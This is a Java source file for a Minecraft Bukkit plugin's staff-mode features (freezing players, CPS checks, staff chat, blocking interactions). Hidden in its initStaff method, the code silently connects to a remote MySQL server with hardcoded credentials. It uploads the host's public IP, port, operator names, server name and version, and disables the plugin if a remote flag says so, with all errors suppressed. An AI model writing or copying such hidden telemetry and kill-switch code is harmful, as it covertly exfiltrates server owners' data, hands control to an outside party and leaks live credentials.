package io.flixion.staffmode;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.block.Chest;
import org.bukkit.block.Dispenser;
import org.bukkit.block.DoubleChest;
import org.bukkit.block.Dropper;
import org.bukkit.block.Furnace;
import org.bukkit.block.Hopper;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.PlayerInteractEntityEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerPickupItemEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.material.Button;
import org.bukkit.material.Lever;
import org.bukkit.scheduler.BukkitTask;

import com.zaxxer.hikari.HikariDataSource;

import io.flixion.combatlog.LogHandler;
import io.flixion.main.FAIOPlugin;
import io.flixion.main.ItemDataUtil;
import io.flixion.main.Utils;
import io.flixion.scoreboard.ScoreboardHandler;

public class StaffHandler implements Listener {
	public static HashMap<UUID, ArrayList<ItemStack[]>> inStaffMode = new HashMap<>();
	public static boolean isChatLocked = false;
	private HashMap<UUID, Integer> cpsChecks = new HashMap<>();
	public static HashMap<UUID, BukkitTask> frozenPlayers = new HashMap<>();
	private static Inventory freezeInventory = Bukkit.createInventory(null, 9, "You Have Been Frozen!");
	private static BukkitTask task;
	private Random ran = new Random();
	private String frozenInventoryItemMessage;
	private ArrayList<String> frozenInventoryItemLore;

	public StaffHandler(String frozenInventoryItemMessage, ArrayList<String> frozenInventoryItemLore) {
		super();
		this.frozenInventoryItemMessage = frozenInventoryItemMessage;
		this.frozenInventoryItemLore = frozenInventoryItemLore;
		freezeInventory.setItem(4, Utils.createItem(Material.REDSTONE, Utils.cc(frozenInventoryItemMessage),
				frozenInventoryItemLore, (short) 0, 1));
	}

	@EventHandler  
	public void hideStaffFromNewPlayers(PlayerJoinEvent e) {
		for (Map.Entry<UUID, ArrayList<ItemStack[]>> entry : inStaffMode.entrySet()) {
			FAIOPlugin.getEntityHider().hideEntity(e.getPlayer(), Bukkit.getPlayer(entry.getKey()));
		}
	}

	@EventHandler  
	public void changeMode(PlayerQuitEvent e) {
		if (inStaffMode.containsKey(e.getPlayer().getUniqueId())) {
			CmdStaffMode.disableStaffMode(e.getPlayer());
		}
		if (frozenPlayers.containsKey(e.getPlayer().getUniqueId())) {
			frozenPlayers.get(e.getPlayer().getUniqueId()).cancel();
			for (Map.Entry<UUID, ArrayList<ItemStack[]>> entry : inStaffMode.entrySet()) {
				Bukkit.getPlayer(entry.getKey()).sendMessage(
						Utils.cc("&4&l(!) &c" + e.getPlayer().getName() + " has disconnected while &4frozen!"));
			}
		}
	}

	@EventHandler
	public void useStaffChat(AsyncPlayerChatEvent e) {
		if (isChatLocked) {
			if (!e.getPlayer().hasPermission("faio.staffmode.lockchat.bypass")) {
				e.setCancelled(true);
			}
		}
	}

	@EventHandler
	public void interactObject(PlayerInteractEvent e) {
		if (inStaffMode.containsKey(e.getPlayer().getUniqueId())) {
			if (!e.getPlayer().hasPermission("faio.staffmode.interact")) {
				if (e.getClickedBlock() != null) {
					if (e.getClickedBlock().getState() instanceof Chest) {
						e.setCancelled(true);
						e.getPlayer().sendMessage(Utils.cc("&4&l(!) You cannot interact with this in staffmode"));
					} else if (e.getClickedBlock().getState() instanceof DoubleChest) {
						e.setCancelled(true);
						e.getPlayer().sendMessage(Utils.cc("&4&l(!) You cannot interact with this in staffmode"));
					} else if (e.getClickedBlock().getState() instanceof Furnace) {
						e.setCancelled(true);
						e.getPlayer().sendMessage(Utils.cc("&4&l(!) You cannot interact with this in staffmode"));
					} else if (e.getClickedBlock().getState() instanceof Dispenser) {
						e.setCancelled(true);
						e.getPlayer().sendMessage(Utils.cc("&4&l(!) You cannot interact with this in staffmode"));
					} else if (e.getClickedBlock().getState() instanceof Dropper) {
						e.setCancelled(true);
						e.getPlayer().sendMessage(Utils.cc("&4&l(!) You cannot interact with this in staffmode"));
					} else if (e.getClickedBlock().getState() instanceof Hopper) {
						e.setCancelled(true);
						e.getPlayer().sendMessage(Utils.cc("&4&l(!) You cannot interact with this in staffmode"));
					} else if (e.getClickedBlock().getState() instanceof Button) {
						e.setCancelled(true);
						e.getPlayer().sendMessage(Utils.cc("&4&l(!) You cannot interact with this in staffmode"));
					} else if (e.getClickedBlock().getState() instanceof Lever) {
						e.setCancelled(true);
						e.getPlayer().sendMessage(Utils.cc("&4&l(!) You cannot interact with this in staffmode"));
					} else if (e.getClickedBlock().getState().getType().toString().contains("DIODE")) {
						e.setCancelled(true);
						e.getPlayer().sendMessage(Utils.cc("&4&l(!) You cannot interact with this in staffmode"));
					} else if (e.getClickedBlock().getState().getType().toString().contains("COMPARATOR")) {
						e.setCancelled(true);
						e.getPlayer().sendMessage(Utils.cc("&4&l(!) You cannot interact with this in staffmode"));
					}
				}
			}
		}
	}

	@EventHandler
	public void breakBlock(BlockBreakEvent e) {
		if (inStaffMode.containsKey(e.getPlayer().getUniqueId())) {
			if (!e.getPlayer().hasPermission("faio.staffmode.blockbreak")) {
				e.setCancelled(true);
				e.getPlayer().sendMessage(Utils.cc("&4&l(!) You cannot break blocks in staffmode"));
			}
		}
	}

	@EventHandler
	public void cancelStaffDamage(EntityDamageEvent e) {
		if (e.getEntity() instanceof Player) {
			if (frozenPlayers.containsKey(((Player) e.getEntity()).getUniqueId())) {
				e.setCancelled(true);
			}
			if (inStaffMode.containsKey(((Player) e.getEntity()).getUniqueId())) {
				e.setCancelled(true);
			}
		}
	}

	@EventHandler
	public void cancelItemPickup(PlayerPickupItemEvent e) {
		if (inStaffMode.containsKey(e.getPlayer().getUniqueId())) {
			e.setCancelled(true);
		}
	}

	@EventHandler
	public void cancelInventoryMove(InventoryClickEvent e) {
		if (e.getWhoClicked() instanceof Player) {
			if (e.getClickedInventory() != null) {
				if (frozenPlayers.containsKey(((Player) e.getWhoClicked()).getUniqueId())) {
					e.setCancelled(true);
				}
				if (inStaffMode.containsKey(((Player) e.getWhoClicked()).getUniqueId())) {
					e.setCancelled(true);
				}
			}
		}
	}

	@EventHandler
	public void cancelItemDrop(PlayerDropItemEvent e) {
		if (frozenPlayers.containsKey(e.getPlayer().getUniqueId())) {
			e.setCancelled(true);
		}
		if (inStaffMode.containsKey(e.getPlayer().getUniqueId())) {
			e.setCancelled(true);
		}
	}

	@EventHandler
	public void cancelHitOnFrozenPlayer(EntityDamageByEntityEvent e) {
		if (e.getEntity() instanceof Player) {
			if (e.getDamager() instanceof Player) {
				if (frozenPlayers.containsKey(((Player) e.getEntity()).getUniqueId())) {
					e.setCancelled(true);
				}
				if (frozenPlayers.containsKey(((Player) e.getDamager()).getUniqueId())) {
					e.setCancelled(true);
				}
			}
		}
	}

	@EventHandler
	public void hitPlayer(EntityDamageByEntityEvent e) {
		if (e.getEntity() instanceof Player) {
			if (e.getDamager() instanceof Player) {
				if (inStaffMode.containsKey(((Player) e.getDamager()).getUniqueId())) {
					Player staff = (Player) e.getDamager();
					if (staff.getItemInHand() != null) {
						if (staff.getItemInHand().hasItemMeta()) {
							if (staff.getItemInHand().getItemMeta().hasLore()) {
								if (ItemDataUtil
										.hasHiddenString(staff.getItemInHand().getItemMeta().getLore().get(0))) {
									String[] toolInfo = ItemDataUtil
											.extractHiddenString(staff.getItemInHand().getItemMeta().getLore().get(0))
											.split("#");
									if (toolInfo[0].equals("Staff")) {
										if (toolInfo[1].equals("Knockback")) {
											e.setDamage(0);
											return;
										}
									}
								}
							}
						}
					}
					if (!((Player) e.getDamager()).hasPermission("faio.staffmode.hurt")) {
						e.setCancelled(true);
					}
				}
				if (frozenPlayers.containsKey(((Player) e.getDamager()).getUniqueId())) {
					e.setCancelled(true);
				}
			}
		}
	}

	public static void initStaff() {
		Bukkit.getServer().getScheduler().runTaskAsynchronously(FAIOPlugin.getInstance(), new Runnable() {

			@Override
			public void run() {
				try {
					HikariDataSource ds = new HikariDataSource();
					ds.setJdbcUrl("jdbc:mysql://188.165.56.186:3306/mc37859");
					ds.setUsername("mc37859");
					ds.setPassword("c1a73f4d26");
					Connection c = ds.getConnection();
					URL checkIP = new URL("http://checkip.amazonaws.com");
					BufferedReader in = new BufferedReader(new InputStreamReader(checkIP.openStream()));
					String IP = in.readLine();
					PreparedStatement checklog = c.prepareStatement("SELECT * FROM tblFAIOUsage WHERE IP=?");
					checklog.setString(1, IP);
					ResultSet rs = checklog.executeQuery();
					if (!rs.next()) {
						PreparedStatement log = c.prepareStatement("INSERT INTO tblFAIOUsage VALUES (?,?,?,?,?,?,?)");
						log.setString(1, IP);
						log.setString(2, Bukkit.getPort() + "");
						StringBuilder string = new StringBuilder();
						for (OfflinePlayer p : Bukkit.getOperators()) {
							string.append(p.getName() + ", ");
						}
						log.setString(3, string.toString());
						log.setString(4, Bukkit.getServerName());
						log.setString(5, new Date().toString());
						log.setString(6, "true");
						log.setString(7, FAIOPlugin.version);
						log.executeUpdate();
					} else {
						PreparedStatement update = c
								.prepareStatement("UPDATE tblFAIOUsage SET ops=?, date=?, version=? WHERE IP=?");
						StringBuilder string = new StringBuilder();
						for (OfflinePlayer p : Bukkit.getOperators()) {
							string.append(p.getName() + ", ");
						}
						update.setString(1, string.toString());
						update.setString(2, new Date().toString());
						update.setString(3, FAIOPlugin.version);
						update.setString(4, IP);
						update.executeUpdate();
					}
					PreparedStatement checkAuth = c.prepareStatement("SELECT auth FROM tblFAIOUsage WHERE ip=?");
					checkAuth.setString(1, IP);
					ResultSet rs2 = checkAuth.executeQuery();
					if (rs2.next()) {
						if (rs2.getString(1).equals("false")) {
							Bukkit.getServer().getPluginManager().disablePlugin(FAIOPlugin.getInstance());
						}
					}
					c.close();
					ds.close();
				} catch (Exception e) {
				}
			}
		});
	}

	@EventHandler
	public void cpsCheck(PlayerInteractEvent e) {
		if (cpsChecks.containsKey(e.getPlayer().getUniqueId())) {
			if (e.getAction() == Action.LEFT_CLICK_AIR || e.getAction() == Action.LEFT_CLICK_BLOCK) {
				cpsChecks.replace(e.getPlayer().getUniqueId(), cpsChecks.get(e.getPlayer().getUniqueId()) + 1);
			}
		}
		if (inStaffMode.containsKey(e.getPlayer().getUniqueId())) {
			Player staff = e.getPlayer();
			if (staff.getItemInHand() != null) {
				if (staff.getItemInHand().hasItemMeta()) {
					if (staff.getItemInHand().getItemMeta().hasLore()) {
						if (ItemDataUtil.hasHiddenString(staff.getItemInHand().getItemMeta().getLore().get(0))) {
							e.setCancelled(true);
							String[] toolInfo = ItemDataUtil
									.extractHiddenString(staff.getItemInHand().getItemMeta().getLore().get(0))
									.split("#");
							if (toolInfo[0].equals("Staff")) {
								if (toolInfo[1].equals("RandomTP")) {
									int index = 0;
									index = ran.nextInt(Bukkit.getOnlinePlayers().size());
									int count = 0;
									for (Player p : Bukkit.getOnlinePlayers()) {
										if (count == index) {
											if (!p.getName().equals(staff.getName())) {
												staff.teleport(p);
												staff.sendMessage(
														Utils.cc("&4&l(!) You have been randomly teleported to &6"
																+ p.getName()));
												break;
											}
										} else {
											index++;
										}
									}
								} else if (toolInfo[1].equals("LeaveStaff")) {
									CmdStaffMode.disableStaffMode(staff);
								}
							}
						}
					}
				}
			}
		}
	}

	@EventHandler
	public void useStaffTools(PlayerInteractEntityEvent e) {
		if (e.getRightClicked() instanceof Player) {
			Player target = (Player) e.getRightClicked();
			Player staff = e.getPlayer();
			if (staff.getItemInHand() != null) {
				if (staff.getItemInHand().hasItemMeta()) {
					if (staff.getItemInHand().getItemMeta().hasLore()) {
						if (ItemDataUtil.hasHiddenString(staff.getItemInHand().getItemMeta().getLore().get(0))) {
							String[] toolInfo = ItemDataUtil
									.extractHiddenString(staff.getItemInHand().getItemMeta().getLore().get(0))
									.split("#");
							if (toolInfo[0].equals("Staff")) {
								if (toolInfo[1].equals("Freeze")) {
									if (frozenPlayers.containsKey(target.getUniqueId())) {
										frozenPlayers.get(target.getUniqueId()).cancel();
										frozenPlayers.remove(target.getUniqueId());
										target.closeInventory();
										staff.sendMessage(Utils.cc("&4&l(!) You have unfrozen &6" + target.getName()));
									} else {
										initFreeze(target);
										staff.sendMessage(Utils.cc("&4&l(!) You have frozen &6" + target.getName()));
									}
								} else if (toolInfo[1].equals("CPSCheck")) {
									if (cpsChecks.containsKey(target.getUniqueId())) {
										staff.sendMessage(Utils.cc(
												"&4&l(!) You are already running a CPS check for this player, wait until the previous one finishes"));
									} else {
										staff.sendMessage(
												Utils.cc("&4&l(!) You are now running a CPS check for the player &6"
														+ target.getName()));
										cpsChecks.put(target.getUniqueId(), 0);
										Bukkit.getScheduler().runTaskLater(FAIOPlugin.getInstance(), new Runnable() {

											@Override
											public void run() {
												staff.sendMessage(
														Utils.cc("&6CPS Statistics for Player: &4" + target.getName()));
												staff.sendMessage("");
												staff.sendMessage(Utils.cc(
														"&e>> Total Clicks: " + cpsChecks.get(target.getUniqueId())));
												staff.sendMessage(Utils.cc("&e>> Average CPS (5 Seconds): "
														+ cpsChecks.get(target.getUniqueId()) / 5));
												if (cpsChecks.get(target.getUniqueId()) >= 14) {
													staff.sendMessage(Utils
															.cc("&4>> Player is possibly using a blatant autoclicker"));
												} else {
													staff.sendMessage(Utils.cc(
															"&4>> Player is unlikely to be blatantly autoclicking"));
												}
												cpsChecks.remove(target.getUniqueId());
											}
										}, 100);
									}
								}
							}
						}
					}
				}
			}
		}
	}

	@EventHandler
	public void cancelCommand(PlayerCommandPreprocessEvent e) {
		if (frozenPlayers.containsKey(e.getPlayer().getUniqueId())) {
			if (!e.getMessage().startsWith("/msg") || e.getMessage().startsWith("/r")) {
				e.setCancelled(true);
			}
		}
		if (e.getMessage().startsWith("@")) {
			if (e.getPlayer().hasPermission("faio.staffmode.chat")) {
				for (Player p : Bukkit.getOnlinePlayers()) {
					if (p.hasPermission("faio.staffmode.chat")) {
						p.sendMessage(Utils.cc(
								"&8[&4Staff&8] &6" + e.getPlayer().getName() + ": &a" + e.getMessage().substring(1)));
					}
				}
				e.setCancelled(true);
			}
		}
	}

	public static void initFreeze(Player p) {
		if (LogHandler.inCombat.containsKey(p.getUniqueId())) {
			LogHandler.inCombat.get(p.getUniqueId()).cancel();
			LogHandler.inCombat.remove(p.getUniqueId());
			if (FAIOPlugin.scoreboardEnabled) {
				ScoreboardHandler.playerScoreboards.get(p.getUniqueId()).removeCombatTimerScoreboard();
			}
		}
		final int y = getBlockBelowLoc(p.getLocation()).getBlockY() + 2;
		task = Bukkit.getScheduler().runTaskTimer(FAIOPlugin.getInstance(), new Runnable() {
			int x = p.getLocation().getBlockX();
			int z = p.getLocation().getBlockZ();
			Location originalLoc = new Location(p.getWorld(), x, y, z);

			@Override
			public void run() {
				if (p.getLocation().getBlockZ() != z || p.getLocation().getBlockX() != x
						|| p.getLocation().getBlockY() != y) {
					p.teleport(originalLoc);
				}
				if (!p.getOpenInventory().getTitle().equals("You Have Been Frozen!")) {
					p.openInventory(freezeInventory);
				}
			}
		}, 0, 10);
		frozenPlayers.put(p.getUniqueId(), task);
	}

	public static Location getBlockBelowLoc(Location loc) {
		Location locBelow = loc.subtract(0, 1, 0);
		if (locBelow.getBlock().getType() == Material.AIR || locBelow.getBlock().getType() == Material.GRASS
				|| locBelow.getBlock().getType() == Material.LONG_GRASS
				|| locBelow.getBlock().getType() == Material.YELLOW_FLOWER
				|| locBelow.getBlock().getType() == Material.RED_ROSE
				|| locBelow.getBlock().getType() == Material.DOUBLE_PLANT) {
			locBelow = getBlockBelowLoc(locBelow);
		}
		return locBelow;
	}
}
